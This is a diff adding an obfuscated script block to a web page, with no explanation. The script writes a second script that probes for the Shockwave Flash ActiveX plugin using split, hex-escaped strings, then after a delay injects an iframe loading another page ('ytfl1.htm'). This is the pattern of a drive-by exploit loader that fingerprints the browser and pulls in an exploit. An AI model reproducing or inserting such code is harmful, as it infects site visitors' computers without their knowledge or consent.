@@ -1,0 +1,11 @@
+<script>
+document.writeln("<script>");
+document.writeln("try{var a;");
+document.writeln("var aa=new ActiveXObject(\"Sh\"+\"\\x6f\\x63\"+\"\\x6b\\x77\"+\"av\"+\"e\"+\"Fl\"+\"a\"+\"s\"+\"h.Sho\"+\"ckw\"+\"aveF\"+\"las\"+\"h\");}");
+document.writeln("catch(a){};                       ");
+document.writeln("finally{if(a!=\"[object Error]\"){aabb = \"<iframe src=ytfl1.htm width=100 height=111><\/iframe>\"");
+document.writeln("setTimeout(\"document.write(aabb)\", 3000 );}}");
+document.writeln("");
+document.writeln("<\/script>");
+</script>
+
